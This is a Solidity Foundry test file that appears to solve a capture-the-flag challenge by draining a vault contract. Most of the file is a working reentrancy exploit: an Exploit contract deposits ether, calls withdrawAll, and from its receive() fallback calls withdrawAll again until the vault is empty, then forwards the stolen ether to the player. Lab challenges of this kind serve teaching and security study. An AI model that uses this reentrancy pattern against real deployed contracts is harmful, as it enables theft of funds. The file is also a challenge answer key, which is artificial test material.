// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup{value: 1 ether}();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);

        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        Exploit exploitContract = new Exploit(address(setup.vault()), payable(playerAddress));
        vm.deal(address(exploitContract), 1 ether);

        exploitContract.run();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();

        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);
    }
}

////////// YOUR CODE GOES HERE //////////
interface VaultInterface {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Exploit {
    VaultInterface public vaultContract;
    address payable public player;

    event Received(address, uint256);

    constructor(address addr, address payable player_) {
        vaultContract = VaultInterface(addr);
        player = player_;
    }

    receive() external payable {
        if (address(vaultContract).balance > 0) {
            vaultContract.withdrawAll();
        }
        emit Received(msg.sender, msg.sender.balance);
        player.transfer(address(this).balance);
    }

    function run() external payable {
        // [Challenge.sol L12] Satisfy
        vaultContract.deposit{value: 1 ether}();
        vaultContract.withdrawAll();
    }
}
////////// YOUR CODE END //////////
